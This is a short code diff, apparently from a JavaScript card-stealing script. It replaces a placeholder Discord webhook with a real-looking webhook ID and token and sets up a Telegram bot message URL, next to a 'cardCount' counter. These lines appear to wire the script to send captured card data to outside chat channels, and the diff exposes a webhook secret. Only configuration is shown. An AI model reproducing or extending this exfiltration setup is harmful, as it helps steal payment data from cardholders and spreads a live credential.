@@ -1,4 +1,4 @@
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"; // ← change
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/948907163756167198/aTWv2HRSlNoxxyTZIWge-IAnDm7gkZXnlXOzN7c-qnuPipBEfyBt8Z1cA_AhWBA6buEs";
 const TELEGRAM_BOT   = "https://api.telegram.org/botYOURTOKEN/sendMessage?chat_id=YOURID&text=";
 
 let cardCount = 0;
